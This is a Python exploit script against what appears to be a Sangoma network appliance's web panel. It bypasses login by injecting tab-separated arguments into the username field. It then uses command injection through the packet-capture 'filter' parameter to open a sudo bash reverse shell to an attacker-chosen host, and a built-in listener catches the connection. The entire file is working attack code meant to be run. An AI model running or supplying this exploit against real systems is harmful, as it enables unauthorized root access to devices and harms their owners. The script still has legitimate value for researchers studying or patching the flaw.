#!/usr/bin/env python3
import requests
import sys
import telnetlib
import socket
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def handler(lp): # handler borrowed from Stephen Seeley.
    print(f"[+] starting handler on port {lp}")
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[*] Got connection from {addr[0]}")
    t.sock = conn
    print("[$] Shell popped :P")
    t.interact()

def do_login_hax(base_url):
    login_url = base_url + "/index.php"
    session = requests.Session()
    exploit_data = {'reserved_username': 'root\t-a\tinfo',
    				 'reserved_password': 'lololol'}
    try:
        print("[+] Attempting to bypass authentication...")
        f = session.post(url=login_url, data=exploit_data, verify=False, allow_redirects=False)
    except:
        print("[-] oh no it went wrong, sorry, good luck debugging")
        sys.exit(0)
    if (f.status_code == 302 and f.headers['Location'] == '/SAFe/sng_control_panel'):
        return session
    else:
        return None

def do_remote_exec(base_url, session, command):
    target_url = base_url + "/admin/sng_capture.php"
    injection = f".*$({command})"
    print(injection)
    exploit_data = {"all_eth": "all_eth",
                    "filter": injection,
                    "capture": "Capture"}
    headers = {"Referer": target_url}
    exp = session.post(url=target_url, data=exploit_data, verify=False)

def exp(base_url, cb_host, cb_port):
    session = do_login_hax(base_url)
    if session is None:
        sys.exit("[-] Authentication bypass failure, bailing...")
    print("[*] Auth bypass succeeded, we can proceed...")
    reverse_shell = f"sudo nohup bash -i >& /dev/tcp/{cb_host}/{cb_port} 0>&1 &"
    print(f"[*] Using {cb_host}:{cb_port} for connectback...")
    handlerthr = Thread(target=handler, args=(int(cb_port),))
    handlerthr.start()
    print("[+] Doing the command injection...")
    do_remote_exec(base_url, session, reverse_shell)

def main(args):
    if len(args) != 4:
        sys.exit("use: %s https://some-nsg.lol:443 hacke.rs 1337" %(args[0]))
    exp(base_url=args[1], cb_host=args[2], cb_port=args[3])

if __name__ == "__main__":
    main(args=sys.argv)
